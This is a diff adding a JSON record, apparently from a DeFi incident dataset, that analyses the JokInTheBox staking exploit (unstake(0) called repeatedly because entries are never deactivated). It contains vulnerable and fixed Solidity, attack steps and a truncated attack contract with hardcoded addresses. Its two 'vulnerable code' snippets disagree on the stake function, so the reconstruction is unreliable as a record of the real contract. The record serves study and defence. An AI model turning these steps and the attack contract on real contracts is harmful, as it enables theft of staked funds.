@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-06-XX_JokInTheBox_UnstakeIndexZeroRepeat",
+ "source_file": "2024/2024-06-XX_JokInTheBox_UnstakeIndexZeroRepeat.md",
+ "title": "JokInTheBox — unstake(index=0) Repeated-Call Vulnerability Analysis",
+ "date": "2024-06-01",
+ "protocol": "JokInTheBox",
+ "chain": "Ethereum",
+ "loss_raw": "~9.2 ETH",
+ "loss_usd": null,
+ "root_cause": "The `unstake(uint256 index)` function does not delete the staking entry after withdrawal, allowing repeated calls with the same index=0; after a 3-day waiting period, the principal can be withdrawn indefinitely",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no entry deletion after unstake\ncontract JokInTheBoxStaking {\n    struct StakeEntry {\n        uint256 amount;\n        uint256 startTime;\n        bool active;\n    }\n    mapping(address => StakeEntry[]) public stakes;\n\n    function stake(uint256 amount) external {\n        stakes[msg.sender].push(StakeEntry({\n            amount: amount,\n            startTime: block.timestamp,\n            active: true\n        }));\n        JOK.transferFrom(msg.sender, address(this), amount);\n    }\n\n    function unstake(uint256 index) external {\n        StakeEntry storage entry = stakes[msg.sender][index];\n        require(entry.active, \"not active\");\n        require(block.timestamp >= entry.startTime + 3 days, \"locked\");\n\n        //",
+  "❌ No entry deletion — active flag is never set to false\n        uint256 amount = entry.amount;\n        JOK.transfer(msg.sender, amount);\n        // entry.active = false; ← this line is missing\n    }\n}\n\n//",
+  "// File: JokInTheBoxStaking.sol\n    function stake(uint256 amount, uint256 lockPeriod) external {  // ❌ vulnerability\n        require(validLockPeriods[lockPeriod].isValid, \"Invalid lock period!\");\n\n        uint256 currentDay = getCurrentDay();\n\n        stakes[msg.sender].push(Stake({\n                unstaked: false,\n                amountStaked: amount,\n                lockPeriod: lockPeriod,\n                stakedDay: currentDay,\n                unstakedDay: 0\n        }));\n        totalStaked += amount;\n\n        jokToken.transferFrom(msg.sender, address(this), amount); // Transfer JOK from user to the contract\n\n        emit NewStake(msg.sender, amount, block.timestamp, lockPeriod, stakes[msg.sender].length - 1);\n    }"
+ ],
+ "code_after": [
+  "✅ Safe code: immediately invalidate the entry after withdrawal\nfunction unstake(uint256 index) external {\n    StakeEntry storage entry = stakes[msg.sender][index];\n    require(entry.active, \"not active\");\n    require(block.timestamp >= entry.startTime + 3 days, \"locked\");\n\n    entry.active = false;  // update state first (CEI pattern)\n    uint256 amount = entry.amount;\n    entry.amount = 0;\n    JOK.transfer(msg.sender, amount);\n}"
+ ],
+ "steps": [
+  "→ [1] Acquire JOK tokens (swap)",
+  "→ [2] stake(amount)",
+  "→ [3] Wait 3 days (test: vm.warp +3 days)",
+  "→ [4] unstake(0) × N repeated calls",
+  "→ [5] Swap JOK → ETH",
+  "→ [6] ~9.2 ETH stolen"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Acquire JOK tokens (swap)\n  │\n  ├─→ [2] stake(amount)\n  │         └─ stakes[attacker][0] = {amount, startTime, active=true}\n  │\n  ├─→ [3] Wait 3 days (test: vm.warp +3 days)\n  │\n  ├─→ [4] unstake(0) × N repeated calls\n  │         └─ entry.active = true (never changed)\n  │         └─ block.timestamp >= startTime + 3days (passes)\n  │         └─ transfers amount JOK on every call\n  │         └─ staking pool drained\n  │\n  ├─→ [5] Swap JOK → ETH\n  │\n  └─→ [6] ~9.2 ETH stolen",
+  "interface IJokInTheBoxStaking {\n    function stake(uint256 amount) external;\n    function unstake(uint256 index) external;\n}\n\ninterface IUniswapV2Router {\n    function swapExactTokensForETH(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ncontract AttackContract {\n    IJokInTheBoxStaking constant staking = IJokInTheBoxStaking(0xA6447f6156EFfD23EC3b57d5edD978349E4e192d);\n    IERC20 constant JOK = IERC20(0xA728Aa2De568766E2Fa4544Ec7A77f79c0bf9F97);\n\n    function testExploit() external {\n        // [1] Acquire JOK and stake\n        uint256 stakeAmount = JOK.balanceOf(address(this));\n        JOK.approve(address(staking), stakeAmount);\n        staking.stake"
+ ]
+}
